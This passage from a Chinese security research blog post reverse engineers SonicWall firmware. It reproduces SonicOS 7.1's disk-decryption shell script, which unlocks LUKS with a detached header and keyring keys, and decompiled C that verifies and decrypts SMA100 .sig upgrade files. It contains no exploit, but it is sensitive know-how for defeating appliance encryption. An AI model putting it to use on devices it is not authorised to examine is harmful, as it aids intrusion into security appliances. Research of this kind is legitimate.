class="variable">$INSTALLER_DECRYPT_KEY</span> <span class="variable">$FW_DECRYPT_KEY</span> <span class="variable">$SUNUP_DECRYPT_KEY</span></span><br><span class="line">    <span class="keyword">do</span> keys_install_key <span class="string">&quot;<span class="variable">$&#123;SCX_KEY_PATH&#125;</span>$name<span class="variable">$&#123;SCX_KEY_SUFFIX&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$name</span>&quot;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> <span class="variable">$SSDH_VERIFY_PUB</span> <span class="variable">$INSTALLER_VERIFY_PUB</span></span><br><span class="line">    <span class="keyword">do</span> keys_install_pub <span class="string">&quot;<span class="variable">$&#123;SCX_KEY_PATH&#125;</span>$name<span class="variable">$&#123;SCX_KEY_SUFFIX&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$name</span>&quot;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个脚本程序会将 SYSTEM.LIC 中的密钥按照相同的解密逻辑解密，然后加载到内核密钥链中，供后面的程序使用。</p>
<p>最后在 opt&#x2F;sonicwall&#x2F;soniccore&#x2F;scripts&#x2F;disks 脚本中，会执行真正的解密磁盘操作。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/cryptic_foobar</span></span><br><span class="line"><span class="comment"># shellcheck shell=bash</span></span><br><span class="line"><span class="comment"># shellcheck disable=SC1091</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copyright 2019 SonicWALL Corporation.</span></span><br><span class="line"><span class="comment"># All rights reserved</span></span><br><span class="line"><span class="comment"># Initial Author: sliddicott@sonicwall.com</span></span><br><span class="line"></span><br><span class="line">PLATFORM_CONFIG_DIR=/usr/lib/config/platform</span><br><span class="line">. <span class="variable">$PLATFORM_CONFIG_DIR</span>/system.sh</span><br><span class="line">. <span class="variable">$PLATFORM_CONFIG_DIR</span>/image.sh</span><br><span class="line"></span><br><span class="line">. sissy <span class="string">&quot;disks&quot;</span> || <span class="built_in">return</span> 0</span><br><span class="line">sissy_load <span class="string">&quot;sunup&quot;</span> || sissy_fail <span class="string">&quot;Could not load required module sunup.&quot;</span> || sissy_calledAsScript || <span class="built_in">return</span> $?</span><br><span class="line"></span><br><span class="line">: <span class="string">&quot;<span class="variable">$&#123;LUKS:=luks&#125;</span>&quot;</span></span><br><span class="line">: <span class="string">&quot;<span class="variable">$&#123;SYSTEM_PARTITION_NAME:=SYSTEM&#125;</span>&quot;</span></span><br><span class="line">: <span class="string">&quot;<span class="variable">$&#123;LUKS_HEADER:=<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>.SYS&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">decrypt_luks_header</span></span>() &#123;</span><br><span class="line">  <span class="comment"># Separate the declaration from the initialization else &#x27;local&#x27; eats the exit code (https://stackoverflow.com/a/4421282/14627257)</span></span><br><span class="line">  <span class="built_in">local</span> r1</span><br><span class="line">  <span class="built_in">local</span> r2</span><br><span class="line">  <span class="comment"># this looks like hell because it runs under busybox sh as well, so no &lt;( ... )</span></span><br><span class="line">  <span class="built_in">exec</span> 3&lt;&amp;0</span><br><span class="line">  &#123; <span class="built_in">printf</span> <span class="string">&quot;Salted__&quot;</span> ; <span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ; &#125; | openssl enc -d -pbkdf2 -aes-256-cbc <span class="variable">$&#123;3&#125;</span> -pass fd:3 -out <span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">  <span class="comment"># Ensure printf and openssl return 0</span></span><br><span class="line">  <span class="built_in">test</span> <span class="string">&quot;<span class="variable">$&#123;PIPESTATUS[*]&#125;</span>&quot;</span> = <span class="string">&quot;0 0&quot;</span></span><br><span class="line">  r1=$?</span><br><span class="line">  <span class="comment"># Test the resulting file</span></span><br><span class="line">  cryptsetup luksDump <span class="variable">$2</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">  r2=$?</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Implicitly exit with 0 if both tests pass</span></span><br><span class="line">  <span class="built_in">test</span> <span class="variable">$r1</span> -eq 0 &amp;&amp; <span class="built_in">test</span> <span class="variable">$r2</span> -eq 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">recover_luks_header</span></span>() &#123;</span><br><span class="line">  <span class="built_in">test</span> -z <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> &amp;&amp; <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYNAME</span>&quot;</span> &amp;&amp; LUKS_HEADER_KEYID=$(keyctl search <span class="string">&quot;<span class="variable">$&#123;LUKS_KEYRING&#125;</span>&quot;</span> user <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYNAME</span>&quot;</span>)</span><br><span class="line">  <span class="comment">#shellcheck disable=SC2015</span></span><br><span class="line">  <span class="comment"># Try password &quot;as is&quot; with -nopad, then try &quot;as is&quot; without nopad.</span></span><br><span class="line">  <span class="comment"># Then try removing newlines with -nopad, lastly try removing newlines and nopad.</span></span><br><span class="line">  <span class="comment"># Using braces to allow || to work as intended - otherwise it is associated with the test-command exit code rather than the decrypt_luks_header exit code.</span></span><br><span class="line">  <span class="comment"># Our pattern is &quot;echo 0 &amp;&amp; echo 1 || echo 2 &amp;&amp; echo 3&quot; where we only want to see &quot;0 1&quot; or &quot;0 1 2 3&quot;.</span></span><br><span class="line">  <span class="comment"># Without braces we&#x27;ll ALWAYS see &quot;0 1 3&quot;...</span></span><br><span class="line">  &#123; <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> &amp;&amp; keyctl pipe <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> |              decrypt_luks_header <span class="string">&quot;<span class="variable">$&#123;LUKS_HEADER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="string">&quot;-nopad&quot;</span>; &#125; ||</span><br><span class="line">  &#123; <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> &amp;&amp; keyctl pipe <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> |              decrypt_luks_header <span class="string">&quot;<span class="variable">$&#123;LUKS_HEADER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span>;          &#125; ||</span><br><span class="line">  &#123; <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> &amp;&amp; keyctl pipe <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> | decrypt_luks_header <span class="string">&quot;<span class="variable">$&#123;LUKS_HEADER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="string">&quot;-nopad&quot;</span>; &#125; ||</span><br><span class="line">  &#123; <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> &amp;&amp; keyctl pipe <span class="string">&quot;<span class="variable">$LUKS_HEADER_KEYID</span>&quot;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> | decrypt_luks_header <span class="string">&quot;<span class="variable">$&#123;LUKS_HEADER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span>;          &#125; ||</span><br><span class="line">  &#123; sunup_readLuksHeaderKey | decrypt_luks_header <span class="string">&quot;<span class="variable">$&#123;LUKS_HEADER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">just</span></span>() &#123;</span><br><span class="line">  <span class="built_in">set</span> -- $? <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line">  <span class="string">&quot;<span class="variable">$&#123;@:2&#125;</span>&quot;</span></span><br><span class="line">  <span class="built_in">return</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># mount device node $1, cd, and run &quot;$&#123;@:2&#125;&quot;</span></span><br><span class="line"><span class="comment"># return false if mount fails, or exit code of command</span></span><br><span class="line"><span class="function"><span class="title">with_mount</span></span>() &#123;</span><br><span class="line">  <span class="built_in">set</span> -- <span class="string">&quot;<span class="variable">$PWD</span>&quot;</span> <span class="string">&quot;<span class="subst">$(mktemp -d -p /mnt <span class="string">&quot;<span class="variable">$&#123;1##*/&#125;</span>-XXXXXX&quot;</span>)</span>&quot;</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line">  <span class="keyword">if</span> mount <span class="string">&quot;<span class="variable">$3</span>&quot;</span> <span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">  <span class="keyword">then</span> <span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$2</span>&quot;</span> &amp;&amp; <span class="string">&quot;<span class="variable">$&#123;@:4&#125;</span>&quot;</span></span><br><span class="line">       just <span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">       just umount <span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span> <span class="literal">false</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  just <span class="built_in">rmdir</span> <span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">disks_with_mount</span></span>() &#123;</span><br><span class="line">  with_mount <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">disks_unlockHardware_ssdUnlockDeviceProfile</span></span>() &#123;</span><br><span class="line">  sissy_debug <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]&#125;</span> <span class="variable">$&#123;1@Q&#125;</span> <span class="variable">$&#123;2@Q&#125;</span>&quot;</span></span><br><span class="line">  <span class="built_in">local</span> dev=<span class="string">&quot;<span class="variable">$1</span>&quot;</span> profile=<span class="string">&quot;<span class="variable">$2</span>&quot;</span> realdev=<span class="string">&#x27;&#x27;</span></span><br><span class="line">  [[ -n <span class="string">&quot;<span class="variable">$dev</span>&quot;</span> ]] || sissy_warn <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]: No device specified&#125;</span>&quot;</span> || <span class="built_in">return</span> 1</span><br><span class="line">  [[ -n <span class="string">&quot;<span class="variable">$profile</span>&quot;</span> ]] || sissy_warn <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]: No profile specified&#125;</span>&quot;</span> || <span class="built_in">return</span> 1</span><br><span class="line"></span><br><span class="line">  <span class="built_in">local</span> realdev=<span class="string">&#x27;&#x27;</span></span><br><span class="line">  realdev=<span class="string">&quot;<span class="subst">$(realpath <span class="string">&quot;/dev/disk/by-id/block-storage-<span class="variable">$dev</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">  sissy_info <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]&#125;</span>: unlocking <span class="variable">$&#123;realdev@Q&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$realdev</span>&quot;</span> = /dev/* ]]</span><br><span class="line">  <span class="keyword">then</span> </span><br><span class="line">    realdev=<span class="string">&quot;<span class="variable">$&#123;realdev/\/dev\//&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sissy_warn <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]&#125;</span>: Invalid realdev <span class="variable">$&#123;realdev@Q&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">return</span> 1</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  sissy_debug <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]&#125;</span>: ssdunlock -t <span class="variable">$&#123;profile@Q&#125;</span> <span class="variable">$&#123;realdev@Q&#125;</span>&quot;</span></span><br><span class="line">  ssdunlock -t <span class="string">&quot;<span class="variable">$profile</span>&quot;</span> <span class="string">&quot;<span class="variable">$realdev</span>&quot;</span></span><br><span class="line">  sissy_debug <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]&#125;</span> <span class="variable">$&#123;1@Q&#125;</span> <span class="variable">$&#123;2@Q&#125;</span>: Status $?&quot;</span></span><br><span class="line">  <span class="built_in">return</span> $?</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">disks_unlockHardwareAll</span></span>() &#123;</span><br><span class="line">  <span class="built_in">local</span> dev</span><br><span class="line">  <span class="keyword">for</span> dev <span class="keyword">in</span> <span class="variable">$&#123;DISKS_DEVICES_SSDUNLOCK:-&#125;</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    disks_unlockHardware <span class="string">&quot;<span class="variable">$dev</span>&quot;</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">disks_unlockHardware</span></span>() &#123;</span><br><span class="line">  <span class="built_in">local</span> dev=<span class="string">&quot;<span class="variable">$1</span>&quot;</span> profile=<span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$dev</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">  EXP_M0) profile=<span class="string">&quot;<span class="variable">$&#123;SSDUNLOCK_DEVICE_EXP_M0_PROFILE:-<span class="variable">$SSDUNLOCK_DEVICE_DEFAULT_PROFILE</span>&#125;</span>&quot;</span> ;;</span><br><span class="line">  EXP_M1) profile=<span class="string">&quot;<span class="variable">$&#123;SSDUNLOCK_DEVICE_EXP_M1_PROFILE:-<span class="variable">$SSDUNLOCK_DEVICE_DEFAULT_PROFILE</span>&#125;</span>&quot;</span> ;;</span><br><span class="line">  <span class="keyword">esac</span></span><br><span class="line">  <span class="keyword">if</span> [[ -n <span class="string">&quot;<span class="variable">$profile</span>&quot;</span> ]]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">    disks_unlockHardware_ssdUnlockDeviceProfile <span class="string">&quot;<span class="variable">$dev</span>&quot;</span> <span class="string">&quot;<span class="variable">$profile</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sissy_warn <span class="string">&quot;<span class="variable">$&#123;FUNCNAME[0]&#125;</span>: Unsupported device <span class="variable">$dev</span> profile <span class="variable">$profile</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">disks_startEncryptedDisks</span></span>() &#123;</span><br><span class="line">  <span class="comment"># <span class="doctag">TODO:</span> Should we insist --type &quot;$LUKS&quot; ?</span></span><br><span class="line">  <span class="comment"># What if upgrade from LUKS1 ?</span></span><br><span class="line">  sissy_debug <span class="string">&quot;Disks commences, discover volume groups&quot;</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_HEADER</span>&quot;</span> <span class="comment"># look on /dev/disk/by-partlabel/BOOT</span></span><br><span class="line">  <span class="keyword">then</span> <span class="keyword">if</span> with_mount <span class="string">&quot;/dev/disk/by-partlabel/BOOT&quot;</span> recover_luks_header <span class="string">&quot;/tmp/<span class="variable">$LUKS_HEADER</span>&quot;</span></span><br><span class="line">       <span class="keyword">then</span> <span class="keyword">if</span> <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_SYSTEM_KEYID</span>&quot;</span> || <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_SYSTEM_KEYNAME</span>&quot;</span> &amp;&amp; LUKS_SYSTEM_KEYID=$(keyctl search <span class="string">&quot;<span class="variable">$&#123;LUKS_KEYRING&#125;</span>&quot;</span> user <span class="string">&quot;<span class="variable">$LUKS_SYSTEM_KEYNAME</span>&quot;</span>) &amp;&amp; <span class="built_in">test</span> -n <span class="string">&quot;<span class="variable">$LUKS_SYSTEM_KEYID</span>&quot;</span></span><br><span class="line">            <span class="keyword">then</span> <span class="comment"># optimise for correct key or adding newline</span></span><br><span class="line">                 &#123; keyctl pipe <span class="string">&quot;<span class="variable">$LUKS_SYSTEM_KEYID</span>&quot;</span> ; <span class="built_in">printf</span> <span class="string">&#x27;\n&#x27;</span> ; &#125; | cryptsetup open <span class="variable">$&#123;LUKS_HEADER:+--header &quot;/tmp/$LUKS_HEADER&quot;&#125;</span> --key-file /dev/stdin <span class="string">&quot;/dev/disk/by-partlabel/<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1 ||</span><br><span class="line">                 &#123; keyctl pipe <span class="string">&quot;<span class="variable">$LUKS_SYSTEM_KEYID</span>&quot;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span>  ; &#125; | cryptsetup open <span class="variable">$&#123;LUKS_HEADER:+--header &quot;/tmp/$LUKS_HEADER&quot;&#125;</span> --key-file /dev/stdin <span class="string">&quot;/dev/disk/by-partlabel/<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1 ||</span><br><span class="line">                 sunup_readDiskKey | cryptsetup open <span class="variable">$&#123;LUKS_HEADER:+--header &quot;/tmp/$LUKS_HEADER&quot;&#125;</span> --key-file /dev/stdin <span class="string">&quot;/dev/disk/by-partlabel/<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">            <span class="keyword">else</span> <span class="comment"># don&#x27;t correct keyring cos we can&#x27;t</span></span><br><span class="line">                 sunup_readDiskKey | cryptsetup open <span class="variable">$&#123;LUKS_HEADER:+--header &quot;/tmp/$LUKS_HEADER&quot;&#125;</span> --key-file /dev/stdin <span class="string">&quot;/dev/disk/by-partlabel/<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;SYSTEM_PARTITION_NAME&#125;</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">            just dmsetup mknodes &gt;/dev/null 2&gt;&amp;1 <span class="comment"># make sure they are present ready for vgchange</span></span><br><span class="line">       <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  just <span class="built_in">rm</span> -f <span class="string">&quot;/tmp/<span class="variable">$LUKS_HEADER</span>&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">local</span> dev</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> dev <span class="keyword">in</span> <span class="variable">$DEVICES_LUKS</span></span><br><span class="line">  <span class="keyword">do</span> <span class="keyword">if</span> <span class="built_in">test</span> -b <span class="string">&quot;<span class="variable">$dev</span>&quot;</span></span><br><span class="line">     <span class="keyword">then</span> sunup_readDiskKey | cryptsetup open --key-file /dev/stdin <span class="string">&quot;<span class="variable">$dev</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;dev##*/&#125;</span>&quot;</span></span><br><span class="line">     <span class="keyword">else</span> sissy_warn <span class="string">&quot;Device <span class="variable">$dev</span> not found&quot;</span></span><br><span class="line">     <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  just dmsetup mknodes &gt;/dev/null 2&gt;&amp;1 <span class="comment"># make sure they are present ready for vgchange</span></span><br><span class="line"></span><br><span class="line">  just vgchange -ay &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># WARNING: you probably shouldn&#x27;t be using disks_stopEncryptedDisks</span></span><br><span class="line"><span class="comment"># in most cases, as &quot;dmsetup remove_all&quot; is way too violent.</span></span><br><span class="line"><span class="function"><span class="title">disks_stopEncryptedDisks</span></span>() &#123;</span><br><span class="line">  sissy_debug <span class="string">&quot;Stopping encrypted disks&quot;</span></span><br><span class="line">  dmsetup remove_all &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">disks_main</span></span>() &#123;</span><br><span class="line">  [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -eq 0 ] &amp;&amp; &#123;</span><br><span class="line">    sissy_msg <span class="string">&quot;Usage: disks [start|stop]&quot;</span></span><br><span class="line">    <span class="built_in">return</span> 1</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -gt 0 ] ; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    <span class="string">&quot;start&quot;</span>) disks_startEncryptedDisks ;;</span><br><span class="line">    <span class="string">&quot;stop&quot;</span>) disks_stopEncryptedDisks ;;</span><br><span class="line">    <span class="string">&quot;unlock-hardware-all&quot;</span>) disks_unlockHardwareAll <span class="string">&quot;<span class="variable">$&#123;@:2&#125;</span>&quot;</span> ; <span class="built_in">return</span> $? ;;</span><br><span class="line">    <span class="string">&quot;unlock-hardware&quot;</span>) disks_unlockHardware <span class="string">&quot;<span class="variable">$&#123;@:2&#125;</span>&quot;</span> ; <span class="built_in">return</span> $? ;;</span><br><span class="line">    *) sissy_warn <span class="string">&quot;unknown action <span class="variable">$1</span>&quot;</span> ; <span class="built_in">return</span> 1 ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line">    <span class="built_in">shift</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sissy_moduleLoaded</span><br><span class="line">sissy_calledAsScript || <span class="built_in">return</span> 0 </span><br><span class="line">disks_main <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>解密逻辑大致为</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 从内核密钥链加载 TINY:SYSTEM-HEADER 密钥，使用这个密钥解密 SYSTEM.SYS 文件</span><br><span class="line">2. 从内核密钥链加载 TINY:SYSTEM 密钥，结合 SYSTEM.SYS 对磁盘进行解密</span><br></pre></td></tr></table></figure></div>

<p>SYSTEM.SYS 实际上是一个 LUKS header 文件，LUKS 支持将 header 和加密数据分离，在需要时可以通过指定 –header 参数设置 header 文件解密硬盘。</p>
<p>所以到这里我们就理清了 SonicOS 7.1 版本的磁盘解密思路，按照该思路可以编写出本地解密脚本。</p>
<p>具体实现请参考仓库代码。</p>
<h2 id="sig-固件"><a href="#sig-固件" class="headerlink" title=".sig 固件"></a>.sig 固件</h2><p>官方为硬件设备提供的升级包都是 .sig 格式，熵值分析显示固件都是加密的。</p>
<p>虚拟机的升级包和 .sig 文件格式不同，想要分析格式可能需要硬件设备来调试。不过在查找系统镜像时，我发现 SonicWall 的另一款设备 SMA100 的升级包也是 .sig 格式，并且这款设备提供虚拟机镜像。</p>
<p>SMA100 已有<a class="link"   href="https://badmonkey.site/archives/sonicwall-sma-research" >前人<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>详细研究过，这里不再赘述，解包得到系统文件之后，通过搜索和升级相关的信息可以定位到 upgradefirmware 这个程序，它负责接收用户上传的固件并检查是否合法。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_804A58F</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">char</span> *data, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v6[<span class="number">5</span>]; <span class="comment">// [esp+24h] [ebp-A4h] BYREF</span></span><br><span class="line">  <span class="type">int</span> sha_obj[<span class="number">25</span>]; <span class="comment">// [esp+38h] [ebp-90h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// [esp+9Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *filename; <span class="comment">// [esp+A0h] [ebp-28h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+A4h] [ebp-24h]</span></span><br><span class="line">  <span class="type">size_t</span> header_length; <span class="comment">// [esp+A8h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+ACh] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *data_1; <span class="comment">// [esp+B0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+B4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">uint32_t</span> dataval_length; <span class="comment">// [esp+B8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+BCh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !data || size &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">19</span>;</span><br><span class="line">  v14 = sub_804B6A0(a1, a2, &amp;v8, &amp;filename, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">// 初始化几个路径</span></span><br><span class="line">  <span class="keyword">if</span> ( v14 )</span><br><span class="line">    <span class="keyword">return</span> v14;</span><br><span class="line">  data_1 = data;</span><br><span class="line">  v5 = get_opcode(data);                        <span class="comment">// 获取一个字节</span></span><br><span class="line">  v12 = check_format(data_1, v5);               <span class="comment">// 文件格式检查</span></span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">  sub_804D1A1(sha_obj, data_1, size);</span><br><span class="line">  sha1_wrap(sha_obj, v6);                       <span class="comment">// 计算 SHA1 值</span></span><br><span class="line">  v12 = verify_file(data, v6);</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">12</span>;</span><br><span class="line">  header_length = get_header_len(data_1);</span><br><span class="line">  dataval_length = get_data_len(data_1);</span><br><span class="line">  v10 = sub_804D3AC(data_1, size);</span><br><span class="line">  <span class="keyword">if</span> ( (header_length + dataval_length) &gt; size )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> &amp;&amp; (get_opcode(data_1) == <span class="number">6</span> || get_opcode(data_1) == <span class="number">5</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( get_opcode(data_1) != <span class="number">10</span> &amp;&amp; get_opcode(data_1) != <span class="number">9</span> &amp;&amp; get_opcode(data_1) != <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( filename )                               <span class="comment">// /cf/firmware/new/FFWHDR.INF</span></span><br><span class="line">  &#123;</span><br><span class="line">    v16 = header_length &gt; <span class="number">1023</span> ? <span class="number">0</span> : <span class="number">1024</span> - header_length;</span><br><span class="line">    remove(filename);</span><br><span class="line">    v14 = split_header(data, header_length, v16, filename);<span class="comment">// 把 header 写入本地文件</span></span><br><span class="line">    <span class="keyword">if</span> ( v14 )</span><br><span class="line">      <span class="keyword">return</span> v14;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( get_opcode(data_1) == <span class="number">10</span> || get_opcode(data_1) == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dataval_length = aes_decrypt(v10, dataval_length, dataval_length, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dataval_length == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_804C450(&amp;data[header_length], dataval_length, <span class="string">&quot;/cf/firmware/new/CRCHDR.INF&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>简要概括流程：</p>
